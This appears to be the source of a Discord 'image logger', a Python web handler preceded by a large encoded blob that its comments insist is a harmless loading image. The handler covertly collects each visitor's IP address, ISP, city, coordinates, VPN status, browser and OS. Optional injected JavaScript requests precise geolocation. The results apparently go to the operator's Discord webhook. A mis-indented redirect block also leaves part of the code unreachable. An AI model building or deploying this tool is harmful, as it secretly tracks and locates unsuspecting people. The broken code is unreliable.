4_Wd)2R&rNs`$N))3J6`H+gEY9-pcsTYcq^CX)<iSlZI#=-W0|UBkgL18nI+W%JV*&Ks*vaxqwS2IonGrjh}hj=c^xp&paatI2m=G$1EaqKYt&1FQJ5;dmAK55Fo(Zr%lO5@8m?i}l}nG@6}(+f1;G$CdKs9>RS|1hZVf&OTe75Log>cO3`-CQBZW$9Pj>x@aMRVBE!@mt4eS+-itu7E=2=&5hzu=S5?j{))*Lz%#-0XxP(M(EN0=&f<Ep47nrWDYp}<0j6$Mw2SXEF3R+wK^SOg=9)<s*_C{hqnh!!^>ggn7Q%8*Y=-8~Xh8*m^6@7S3mK9-%bTcyC;1j$p1LXe~S(qJU9Q1Gw7wKL5q(|$$Vitt${YKUI@td9UNs01;|#h!tvU<&qwC3?zN+1!VW6?o9oe{f&Yz2Uap+O`zr`ORebiB>H=1iXwM<NSwNNCRTjN=guk&)mYNNDPS@kO9r6V?l(P(21ThLs0-Yc|j1&RpwHz;=A;NS;#Hd)Kyh{-jA5&?Db-b*sDF*M8GjcMF_BO$c8$3gpeo+3h~?j%59)<yWBkunPNW6-N+5wyalRRBORrh9GzG|#>h>8*4Et@HN*w~eS>BIhi|Zi!2QV)JJ&^ALBO!-Y&zh?aEj^qG@ZC#dTxfsxXZ?n45{)>2OT;)UB#j0*X-5ciogs!D7mEujqq!R_d8Qw?q$j?DVr4uHYfy?%;@wDj_h11mVyU7PF9FrBxXKc(^UmaDBdTb;zLoxUg+O$7KtZu%`IFI)(s3(0t|GHikco!QSCh{ChBWaUPEcu?&W914dKVN*Pmq#gb-RMqEL;YgC>+K#98CVqUgtZ<HuTvS-|KPjwzO~Ott<8iKNI)s91>AT0wS&KvsqSJPZn!q2`g?>rlMbIS7hI;xa;DXR_%IiOPn<ULC1Ws$998o$0sake5NAXK2W4nPuuzRTRQC$VAag?XB19rH(D`7lSZbRRlXxNC*gJywpbR%Egc+8s*5*=osCRj$XG=i0ifth1+&!x>ki-;LYEl#Z5>^hM_V&;GJw(ghzISpr9`WpN8Pd>ATg0@xl`=lov*LMV3HLN_etVYuH(co_|q<wUSEBU@FhupHMhlilEm!aLUY;hiOPSP56vKpgBsoN0wmC(w^L3j_9|E5wZ@j{LyIj#f_@XPTP!2J>Fy7F5R~5E#ZJKPm~8?SWj1>8{>Wiq=c#eX`r!W`vk<Ggq^DuYhDm}yDNnS2UT{jD;lQaOT-rc2Vq#kJ(z_S!z*j3@j57&IuLO_Rf#cNB0~76hB;WLk}D(sY9v<_oP`5F7-rX=sF8tTc+g5IFD?%QaM>d8wR8p1`v+#g!rk01FBb+tFqE6jhC8^{{B8#O%@4PuvBR>4HGhP7>X8Rg5JgQ8N{~jbAOr<diDvLDVZfhkSY<x<^E(jo$@xcB=*(LMV<-B9=z4BNn6C=_@kc+^xN?PkTX8%~CB*@2>`@f*Ziw(xbWUF|>=f2yrct8W1d6q7X1<q?dM^rN835UYLI}f)GG$@|LOFQAcbGB%LZAaaa0FF8gilz(kqt0Vt2Y2t*N2~lYrabbEAcR2!yvXqlSuep7z8>C3PfOBC-U->D{n?Xt70qnKK~auctCLAN>>hvP^$ECD~Xc$%7_T|8?kpjwVx<liNB;ZVyLiB5YJ68_1jLdX&C7pEge=!`J5uQLP!Hbp!He-Esb%sUrHg`#EppW_(q!-keBCAQm~??;7fxCS4fB!|8m1k_yO4iN4?5`CWMhA+QN6Sh;a0OAclXTgZGwBMLA*9PGQvkb2u1;Dmv@RdWqjy2e#TO{8>8BN-e6#LW*UDDnf=Ve^$z<kv<2CLx@Chcmy{HcG$@|P2Q#d#9P6Q4;uu9`$r=LxtH0xXKIdPg}qOC9EZnmSOy83;!r_vJdpjROz%CIti)#(bN39$$JH<m%Xc?=)+m@a;47S5dZ*$IC!BK84}GbBgilyYxptLy3}k>ugg@~5e?W$}0tjgTz)_mBiQGR`Y0}I&v`En&J$o!!llKqazjweC9U^q7P$5DfK^`jUr&q>ViU<+<GsqIcW`6$g>4RsMJbA3{;8BF`A22?5=qv(;Fy}vX#0uh}b7$zCI(H6D`)6$qo;!Q!6hiioo2EH;3Yq&y%nzP9z2u=2^^^}EKQ;0E*~4d#+&(k?p#38eD;+p;L?MKS@gHLUi-{34ZfsHU#ea(7$%AKZ-QjPzM1A_SNz*4$qDe86EKHOtQldzy61C}&t9So|4LZaqn>=uj^oRoYZ&n&LY2f%#wCE2VM^*os`}S{Lua1KV)%HW(<Do%=P`*>ia?r$>Gw0sQxpR+CphD@y;j?L0FJaseTO$Nj>K(CE|7F|5Qz{|N@Fxl#bP!V3S!tnUj$3!!1=k*b^ifkEc+sTS9(e4LVN*lJaT`*QEjD6fj6KE}Mix<K**h)1!%Z)tX!2QTqKN{GMbp@*+K#ixModYE2t?2xp=9%qObeya#vUQ@v50`?;G)V;=(rLjOCcR%op#$@G|M6Xdi~)CCF1#k*Bv;SvlAYOm?Muc84kss8*3QU3|p$q=~Pw*3iyp9_YFb}f12=gpjl|CH4rIU>G2?3Gu<)fg=g}mVTMw@0mmSvLH22hj!A~%sE1J&;$`csGtDhBZW2l;qJ;8ZSyHmX8Y`~g;z}rMp(6|-#tlgcdS031${lPhImaT8I4fW_juhf!My?bxNJ!La_s4g*ShSIZXi?%DGknmsm71(zHAq>)^fAXEiWKsPhl9)l&pU1v_|#K%{DI3wz0gb7CRKrTXuD|9v0#Id*2EWImEt9rToKXH;Tv<{7%HftE(TeOks-DsW$2)@jy1DbvPozEuae>lo*6X*A2QBCBT6st$ODXZlvMN$B@&WylrV_wp$U%D6hg_7&;-4m&g76X@3w<*t1V&7%|Zzyiu~~ixo~NyN4j&=K^B~Q#Bnb;z`VxDEWVlZ2v1LK6;&PMCe@20mKcRtHiqJXXo8D^vx%c|;nl~O5kHKVL>XpSAbWJ+Qr4&>a-4Z&DvJ6JJeXBxj%@HO<4Vi1j)t3vk~Kq$w@CU?n?Q57G|1&7!b!&;Ras+nNNX{-Ng;h$J*L&#1^B5snk<44G!PC|_Sx+=r3&VbnKKLJaZt|h9kHEw5k}c;BF7zs6QZ`S4eO;LUlaP#2mLeA6?q^3-Maw?DVTTc@%TC?G7~Yz94jK-Kga<MRe%Oovf2bGgh39<WW*fIa789^CJ$)5#t+bt$2T-l9YSn^8C8PEH-G_%H0VJX|A2-g<lquM2tzj6u*6Kb<r1s$;SZEB;i#OZ2<I$g5A@r^9A;4#Rd|mq8fnV3vT;ImKqD;p8A=_p0+l_m;u{CVMQO~3K18Xo4{}&b2ooo%F^LIc^rN4Kvf`gR$YFn$n2)G5SE2xh>@XPtojfjM7<9M@7^>LBt6T*^9<gRMst84{coYgpAmR{;;7CURk)=Px!3~~N11Q(fhCwW14{*Q(U#e!ch;b{2J9MR(=whk=JLutJLeWFrwBnRHNQIaDqC*ycxv#8r=qVDBh;m-&2u$^madwHz!yslU#z|9RemLe<DCbEb>CR&xBbDd8nV3LgMmFR)4QM<Qs~X8FR;p`cXG9~d>5SxBT|!P97P5vqsbLL!7=*bt6qibYCw_a0Umxn=Fq>e?Vz}g&7VqZEILKiR6`eyI?xRtD{VN;2umn~#5wlq|G;(Nqlo9Drp=mZwn(}*NM6!udIWQ?^1k|IbKvt?f;tP-#F-KWEIx7b@kTVWc-6mWUig=1bS{}L1?T#mhHS|*rZOCUEm=!q<DQ<o(<x4X$HOt89K_YZ`C`6y)6!uX6)S`2k1Lc~6*0kPX5H4iSH^A`|(=7rICEd_7^CHc~$z`CAyXJ;)S)jJcfemmVR8GeCzs>11oEdox1yi-EThK@pme`SvKCx7Gjz%<(xXvMV=#ugDfemY*Dpf%V2jtYjh%2q1T+Y?imD2JqiLK>ae;JkhRJ5WQ-Q}FXR|n+Y!4K3jkvTT<+YR}lx74*}#cVqW$6*MuNNj5y=HOUjoUEJP<Rj-mML~H?FjWXKM>A9r&l#<AsYYcdDcmWeP&^_#q-+UDwp+ie1_zW2nS)ILdqlcS=!j>+<#Z)?u?^*Nt=-!fTi+Vq;|}*?PEjr)DAB-`^;awZ`KypXb<3B<)#WaNWpRW|n!oN<v<+}@1v>ngUU8yVM4vjKi{7!0j1c3HspAX;+j&$7E}0ak6$G|e(vpMjp-#a`169)y2P4Ws4uJKoKsU56e(3>IPtl@<3xo&8zLgFb)o6hPW41B(YnR#tjNKx#RogC3FAGKG{Ni%1u}<zO#hrtVMN!_Ha*nd#+#>-=Mo1T#gBY85#C=yLT6Z$J$*|glB?`fZ<dM2@$<k+4wQLhQ*Tt-o!<1j;G{*wj;flayGhEH~l$m0*&2jZGnYSX56MuQne#OH=!FrcTHF%{Ns*88y$e!Y|!3~5t%w!>5+08A6WF<5I*^tSB3rbjG#IM@)1M@qp8WGhI$;%dX>h}jkqdJsrfJ+@=jj0pUb*;tZ*K&CsUbwos*N1*HaxeDpI%89EiqrFkxC%|Z6jsH2o*#<KYGI1*@2aBs209dz?VLWE+oh@uJf<iQZn)wRD+5hu5qV_K%r`Wb-cmia)5bf%K}q{OaQ@)1WwY|hZoBNIRKAxM@cR0#1{ZkK;TqgCI|Z<De6{2f3s{!gMa9!B>~B9T2gX*r4Wf{uc>&0|kg2`fDBmkkb=C|;g2pv5XPG*Y{E4Dcq7a&Vs@0lJ?|S!hUl|oHe#D|yI@saDPJueX+g#D1IGyPPUwBmi&KePY0~X>APj+F=)#4S$ln#K6YbW;?2gjaWoUV5?q!W`pa#H3p%przrV4k|&&zxm5Vwoix#}StlZxHW`Lq5~+24yWv!)~>8Fz<kCH`l@W6|Mf$v7i07ZWMf&H@08z0^y6-4=xi2bfCk|ud%na4RxA>C}P&Sw8Ng!B0AMYa$>-gYep30_KfbyoB;A3jcmdqPzSuN(){2B9Iyd_fsz`?8Rhw!hfSZ^5M1RHTzFj{_f1~GxfM_J$#8)WPn?yBsg%_LmPwgkUI3b1be_ZTM8p--*wt8_Seq~eQ0z6Dwwc`h<;2OX1MQ`ZC1k=<-CfHJpv`Ijf@d+|BP2o}T++NW4&%H_8@N_%^^=WVpPLmE<Q0hISzz@Y+!tQVp45#9)<K!gU<zuTK(XLltk|E)q59F0MZtml-JmEC0|o8ad957}=23dFg{sKIJCM#hAj2Us0%%-90eXfKJ|ZHK8zme9T)5jGu+gBofj(j3fz^=*I-PMD*INlj#+c%vwLx*oS&hkordXfZVBT^a6Q-2a8~TS|L>z}8TVTcEnShxsZd?r_njU7uQT)&R5l}LY+{jo2=%k#Bq!6fO!X;3G5lSK=u?*g2qa`@vCn$nM{DHiX+KRbB@~uGw%GOn}87i`4D$2nrw&N;xnOJ=Ppa+hi;+>fmMbry^S%gX49RA`hPKw4g1=+d58~BqdG=u*zTK%!zA8O92<k;x6NH%QE|6L<CB2oZmV<Rep85IH}goJ9D3wsn;KV8`xyn!dlqdUIi8^q&Fl3`$&APLq@L_msf*`mX7-W#?c9rj}|4p+t;<QoivD?o#62x2mR)5rwk4h9nWj0#Z6j3T`p%}t^=HlhGp0wtW=A!tQ$OyTj&54}O)8Z3lWxgYY)BR$Fi9K@wu&Lv&SC0x>Fcnt*{0Mk%t(G}ffOxYqaIb4Q3NI%LUgp`$G5)&N>-5ju_IdTdvWJ4c{T;@zx>&)LWmPpBzj1aE>gWG7rBWMCO0^lcHLTP?RCcxb9!5pZCWs^`x55?PEz$I*jQdM0QTef6f_NH%knb3vT8wh7TCY=^(1;6;mVDe%dftj8Klwsn<3-aP`nIwK(6wfuFIWmb+R3=V+=S^AW>rDnB;)|+~!$*nOYF+{WQX^`X=6jOntdJ(TX#yeK1$LZ?{1{Okyg_bORaHTzjrAsE%4LE6rc{Wc(Dfx6HmF~r;n+ONgI?WTP^S@fRhShfa@vhv!etz!9v<!iGUOOk3L=lao*v;}jtOB^PD3cTCyd4@e3E7(QsX1QsC`VumKaec0#*YC2UWEJZo1!99jI>>sFA+^froaIhvvteB;I{U#BnO;a~|6ZMyFw(iFEd(3T_2{2q%bM6&x&rH58%_o+$mDXzNU5=m?qq5yOj;n~cV1jgICcP=cJ&C?jMdU&NdIv>F}c6K)EJDCHrD#w2gT0iy0tT*jn<#^sW_L6=n@R4`~(s3C=MD22YDVp?fpVJVlYpt*FYg6@-zsRGFPMpO2nL#`^xk*8vK5g~p<%gqRV(kZUaDU3P-AJhSt7@v0ZV<%l1T3XdwdeT)PYfC1pjkRP<vZP#6RB*atJrYwr0-Qu7rwnpc=T&K}J&2ZuE0<C$se<Wt{(&&)m8zoXsGMnLvg?T;1!AE8gQ|jqHHg9^e1ccvsfh6_jb6gPlIA76CpBh*ef$$2XbV6=h$$%xfC8yiA!{4FL9&`7LQ1T%Zi-+;Dn0JWwHlM0FlMY3rqyk$sPdw3?WBap8u+*waIT)jQUu6h8@#rwygH<swrl>KjA7_ZQUJpzIKpUdf_wIjCX`#bttXAH=e{BmA*cZz1WicfP@wUg!(tiMijvkYYaSM<Zf2}qzHD20Y^BnYwq6~{&Y;PH>Xl}w$o5HE)REVUsVi^;Ihag|_F!b??W;<pij=2etb=9<?P>CBzfvON?yKVVt0qta9;iVSdQC*sh5Xn79AsgT%GTCatov#IEaxI*ToUJ!R+O8SuBECKW6EH3T4?z7W6Gv2hxir=x@@&cY##uFIq20<)a+x(tE(!bAEF2lwkhaL11TIXx!LLB9xa}FCG&daz8Z=e9D=)9&3(G=j}j^bYGK!c?&o^$Tz1*$M&4S%)lf)j-I!r>TAhXFBy)mUg|IHNfsZJ<0hqP{B|t-7fy26@XuRI+?|##ostCRyMUK6LQsAr5irAetZv!K4;yMezTEZjX0UU?~pE^??Na^K1tQMN8fO2i3(xupvE*P%W>4qSL>SA<?D#Kzaa&icS=EqyfZ5wowKTT#{p~LR_ug$*e4!Yj|RtDgrkSj3%Li1kQ1mCG6IPjhBYx3S{vpfPE;HS>*XKg;9fu&`krr!6)rHviv_)?DPG8g)aEMczi41$@3R!9t6>K%S)MTxK?Fhe$EgI)<C-vaO6nrP0xE4G=#ioU}I?JB=Ma1%o?A}>PYB0}G3#dLJZ!b*;9W-XR|@z+``_zve|-eKtSWqy<~T2X03$uF3(tzr6>hJZ3$aqM=|fhs_QHGBie>G2*5@Xg}vAG#}J9I!m73eYZa^CE5{EAk^0a|1Ina)v~gU~yLXCrT<`#wzO<<DsHTs~lsXo0aWDsjoi5ZtLFS>t5+{dg-pw0dQ6<9jJj_fdd}rl`Y@@vd;E#5dU#5Q_vv411=PTA`CMzBl99tg3vlbA}d08Ws7z|2)E*)S{j%d*ssJ=EVIG^qe80qPOCOoYc4&gH-{i$I_IY{XWM3~TGjAHiI*q20UM}+E7<Eh>y;nxvSj3POsie*{vbt$+`aZQ;yMcx3p6DJ^c4Gav-klpO>HwNj=5MACqiIw3}~ZPa~wo#31_sEewf*U4=Jahb4qB1+Rgm7Y@3-cdpu?*5f~xV%pKb;Ow02Sqv?45aAUA3zVI+KSi&J3G7|%IKtIAF40S*6K^y$Rp6Vw}>;d{<svKDILo;<`R<uQ5bT*T*SZMS<9w&05t>kq7D$Cl<8Efe5wwbxwn3nazG|2K=x3yc#wGg*mL?%Vb5$`YKf+F0hPy6*TOE8`~!Xi*Yvj{YAI}1T;LLs~r2D4GCm08{J6I#OMfI925?#~!g&K&F|e#}+DdGmwLfs}%?g^JDHbo6$=r8R438;}BOPs2NtD0u2EO`BY6pQ)QtkYRAciwdo9JA!Be_aYE<vk){v19xx}^dY#x9b6I&S84WMa`$TNR4XY}j~(|>cM3nKR-3FYdaH(jtjMNt=|*@b#X%Y{0x@KRHJtc*|HNwFv=93*iwkdMsEQCagFrjWe-kur19%hT_<uJ`Z6AVHS`-HVX;ftYtF<OyfEs8XI%dYe<#dCglUDd~uJXx#HE3%^Sfg%*iLPMaus;FAX`gm#vv+&H>U+C(e9!a`vgom7!j0qja3Av&BQc%(cp^|QZx2FN{K34$k5W%)39fW-K)0iY?L~jGUh-u}vxk&Jly{%9xx8(DC>9)8RB?syEZDIutM~qvR{+oRnWMQq|6pY>M_Ek6)*wQi3vIL5`9tLPLp+2csQMK5fq^TmGdG1)L_{Tv(r->`Jz9FT<{AoL5tUkMhISrj!|g^-xv&?P-0tNg$Z|87IH%`vJg+zpiYI)JI=)~;UH=0z5cjGdvwzFEBN)deCBh=GySfYiEho*vui6CV3TA_D=YVqTDo!?qH~N|7<5p)lm0!7oW(9ZCFjG5sT-ueGn>ZfhaS&=dJ;!yK^Re&ta%@Kjfjfk=bd9>t`XzmQyVtpK`~lP+0+i|bKk;QuZTQ8&Ra|-!HZv(10{aAVv!nCLNc)F|cir7!c6P&Uh?})J;z2J|`yGq9-I965<MOBLtc$DpT<1i}@vtj+gpFSkt;;$hq`TLz`^fk6NLthmVaS$ddEG3RoK1D;cG<uQyGg@wVjH=XV_naK>>PP`Mm_3E;{hpTLwck54pU^)gZk5Rdzw%Dsl@g=*f%Nl*Ci3O$Rh%+m&77iz9lLDf+M6BMU5oeYRD-qx1nJ)Lb@WtTl#Q09oe3(e*hD=f|*vFtSd_T!JD*2v7~O!fh&Z$dOQ5mS7m#Ddc4M-@UwO^id<Px#xz*MlRSbVuzR{kzUFg8$h*78YyLyjK^zFemh=!EK!|o@3M->Cw7ZqCcW8o&#d7)k+Hz^^%f8-^t~&qyHy}gcr#M6=eyDeQ;lDLN{F5i|UqN*63L;bVhmj&ilo%~Kq=@38iijpsY`Br4A2@Uh5h66`j-Ney@Z3p>2hYitE#=IS6Eo%<nKW(Ap`-H-ojY~z^jsN~Wl)tU_vq2Xhh<BqDEXX3nKI}el|b*vsWYelryDnL+O!FkjT<y;)3Rl=_KhvLb?XQgEErdA-MR$v+NCSdZr{Cq`2xO+P9VH@y$%sN^eAKFLx&_fl+5w5#H@b`{W00+51*fUPAX-}(&`;OJL$mD%5|qstU9#@)f1G?P?c0was}P;4pNjyof@@@2Wag$a^S>?<EG7?P|dPIgRa(EwzlXF`W38~@4&y?_kIVQ_b)+n1<jo|hpP~yLWwI+oQOzKM#+c@QB;&DF`PRgql#(|0bf$-wv&9y>L!_Tq64*_exmI)pXvb3z?G1S$|<Qr<72f8Z@a^$nHZd74^h^F#;j?qsje+>u!HA2@wCHhpzXN-y9-CT$h%RXfetbZo@_`7=`qLZqv)~v6r+eg`3QmIjXnm^EI_1`!sA2Sda@~wIo@DxC7F7fFt*wZ43Q|LHWbh*skWqTOgZjw<I6b+QDqsmrkMtswAQ-rt-x~Ju}2!UD-_2=(fbFUx8zv|8ci}I1QCqtyL8F=<U7O>P9Zzw4mRq@?8*UMn(D%q_VDS$)*LhwD>SJpil{kud$UccdUFXv1%=W{wdCR$L>04`VJ5mg)8Ymk7~gsau0##(u232g)iEy}=c4PNgP75TN=1xRtVtvv`}E0$mK&*$clj`BDAHOrs#iEts)G(Wl9J;=3TgXnxHNnJ15PSdNptfgdua{o4L4RQ<QBB3t4=MlzHw`vcMO|rM?x3v&c~0%%a%ux<uMF9VJN{vF(c(egtC}D<&=<7H|y+F0;ifcC0yh931HKVYFN#q=%}Npmr!j<w5CcsO{g^ASZxqZa4{<z76HXL<8{nIhvSn;{@B{`c-*#H8?%)s$albD*^faMNhGAZ6?3HSBh@|f5I;y2q>p%;c6uqOW%DT|I)a|MR^0H=Z8s1x+z??mS@Miwo6t=9jz35thB}H{3^e1g-{JTjkIgpOW46r(ncKC0bo)_r!kzm_ykAbtB1JI$gAjJz7-Ww@2I=Fa0-5&7Dy{PW-8UzJL8RWc%A4jeDW)_mxM<E7??Vw$M7L&{X8Z)ybnFh=cy-xBE?aHZf22R;`3b#oAagj*h8Rlxpcp|6!gq%#7kpm!yFV;v5Ps0i9yp`9q#Q0`tSU`VJ~FH8L5@wrF<7d4W-!fF<tRP*10`mmENCo)bS=sTI5I|#7`cyZv2)$ot_8pGSZj9rlMy=B@r{*PA}S+UMDKWq#7hx^4{Y$mmHaR`lZ@t6FA<REM6@rgST9Yu8IDzGl_B4RhJsWH;~+xO3-tM^Pkf@7v)BhjNKxy4wX-33TF1j0`tTnxD#$nf_lH3c;yv|ABHj@A2j(CTRoa99%E9n}xt_$qXCj&n7i(o2r1WM(j+}~b7{-S|P(l^LXa+Qr)gp?qh%KjM-#TPuKSkjYe{{iC9${xFf@CLb<cN+V_%IUWjl_V26bT`dIEOSGLU4qmVii%vGd{S%G&}hf(TIY{Z0ccG3p?1ting0SSR!j{oQ}n~!HtYPOOC07ODypyKRf0zp0q>TT-ukqXF)?1gTR9zleasXA@F8w_(M{3b`n113Yr=kA>~x!6QkKGH>TlcG=(EZ#|6a?j&KDrP8re`s*|KJB8Te6CQHGP=UR9{hz@HcJ6pO`r8$yOr1tlYX^?`6$OEV#$%RPx@L>%Qbf!uF_JGt}aq>3>nkeKXhm}j(>x&jdn5~R@2l0sl7s!y#`LxD0j5&*)ul&b(Y8umf)(?Lx)g%4*Sifr3<)-K`2RNWH3r1*0n1c{168*3SIpmBFr*dRB!3dP3%*!Ws@L=<l#ww~_@R29sOd(L{)n+7XMWwUOi@+hn8K%yDH)Iq&>siOOjtpc!3?e$L(F-C5kbnamq<e}Pl0k&!4^l+c;HrW>4RJ_IE_vum99v0TWpgD66Qh6>p$S!}(NAkkA9YIlEEvhrJ2g}-YvUJQ)wXnY1-Yqfh4_wdAVU<)>;rB6_MXgy<PB;dtbi0o+=f!~sYYR1N+ziPrN@HNiYEymC0Nl5%`)SBs-(_mLHo)_l?<2jEZc?cnM3-;5*{kU&N^h64ZRl8uf`O~d<$_0HE`yM|7_%89V(SR+~Fh9ix3HUQ=6t9h)ta|Fd-1EVCgUzI@UO4b-2b2a=_3n{4>lud<4(7?l6}awlZqJo3eMXPqeWOg(3#$(?i}N4WQ}FfRMVqNd6|8sp5lFsTxUpA$Pz+Y4d;(LCRa0@|0k`Zi~3ltY?u!wA_u$4QJ`rT6)*CZ_VFY$0IGbp@SUjY{o1oAxL5N)l_A^?;aGpW|xS1K%+s;<eZ|kRi%nFr0zpf0~lRa?D>4i5FIlpR^)I02s*TdhUFY#I@b*MP}t(7<vhJ(m`JhjS-S?tCzyB=PR~sZbnrtIH&fZExT&yf))2oy7)e#*c#KzFGa(isidg_-8Mfx^DWlVjK=GQ;65iNLgFRP7)A88d#j>&Gg5F(cY#O(4gac`dJmjSz4o00K1bs_Ia3^Jxzv=Iq3Pf?I{6RB{*aRuMnydw%@6Xl<baq2)Z@4U4p8me_v0JX;@~%``sB_^rE}iL)C*}_f-@`%spcJTNbj{h8%2MbQMuj?3V8&GpD`wpbc8?r=D@qHCP)=xHKMKmR%lFAxuER!${gy5F5&zH;Lv-v@7_P`fA(Aq{HMBwh(?(w^o3#DvUa7fzrO{V}_V6A@SV9!8zy&abK@4}hTcjh+`qnp=vO}kpJ5?@r{KhU*@6PhP-h#(LM7!%|HKP}#phWWezy>!w^4btQ30Jh8IjI!3Va>IqR{cs5O?<-e3QoM@7ys^(pM0Gu|1dcqHRZ{h9nsC-yrMNvdDeZ$wRer7TH4(Uw-;g!D~{J6O43v@w!}(yhl6V5(59MM;^T&&#o>P+|93b3>L!1D9Dfbv4ln=fue0#wQ>*_15c*thJa{QRM9;`n1Q=XFR6faq{6M*8!zSPiB?c)G7J>afK^0s<72ePHfFT6ijTlIf>extq(h24N>}|_F%u)DH08i`X+$zz$4h9`<rV1lH&ME<0gamtG7A%1x_yD-RBurwWS4@Jh2+0wc@DoI#@Lb^odtnNJLF#%T{z{PX=<nuQsrU*Fh`26gI&9@;jsRtD28V5rWKgZhD`gA<A<_fH641|t;RjV=6CNR`^yU%xPy<PU6reB)aRC>4fe@$A3WXsA6)_9nP52y7owRG6R!|J#sRoIS`R?f7Y>@24>rvK$*~sGRz{=g?PZ1As3JLN3a6t-DQ4tkU804?k9I^hmfeTxytiVP+R!7;uYYi*!{{RjRX|M(}4{cnl!w|69z(Ji9aD{9Q85YqLPf_asToD$rFbjci7F{SU$ReG-fviF+W3VGV4shR|kIH~?0EKZFiLt^~%RBf-b*wLAMvsk}VHrlS1QRg?i2?CQ@b|D0_-+k-M5_L_ajdkf(jafkRL2EnsTj{N7%g!VqfY>BFrVON9z}0!tO1q!Oyp!S8$+@Yt!wzk>KmD?+3IZ)J8Z(%(F`v!6DM+qW|Ah;5UzlP>!jr^2yG)dvKHCMPne+@8qXt-tWTh!jofIgvhEwSZXCnrE$%IKv<#<avKV{uCAHEb`3)x35Ik}!b)GC4*NLP8jU!73Ez+`L&Z1(P#T%KdEh=rh(2fPcF!EZ`D%G(jrSB^L-7zA4(GqzvQle!Zl`&)3f*ENMoz60yxG@Dm%PEzSB|k3==}IrnQ6|SLCN;C)022WJqVr<uAlwF)ddV;k6EVNhESVBxVCWlTNb5waE)9(#fhaS}5FJ;`5~qv}Ig_3s@;3$IZIta3rScufksQo{9#b=h<nk6(a=T;*b#`)N%;7k%a~F3B-^wdEztZb$=`V%z@^DiV??QE!ZDYVjDwUJck~2L{6F%LOHl=bZ)6<<KZ!jrxH{0<Xy%Vl@lUvI3<totyF|r`AQ$2a|J>k<f>vJl_<~ALrII|Kw-LXQuaw~iD7x~jd$>u*F&27SRI}^0#qLLir*RwFyGi*LA3|kVG2%^Jm@+CnuJo^(sV{SafD?Bc=ZQ5sAFtR?8b4Brw>uOWdWMmA1bU@EhtuT}whw%kHQ%6$^(x!BeXo^B_B%k0SLbvQVBXnA{)OM!j4V#oN{VzwqQ!{5oJl7P<C=3&8=ceK@W!^$;-pNi^E_JlCFtX*PYV=HnvFvU#e**MOvC{c8aWp#&%2sYLVRS+TqD(V1Q9E-lc@$02kV$t`Q`d1X3e>!+QhzelQ*(1aKeJQ!l0#FqN)L5LT`)fb<EAk4AF=~f1r_WnGBZnc00RO5I{')    
        # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                self.send_response(302)
self.send_header("Location", url)
self.end_headers()
return

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
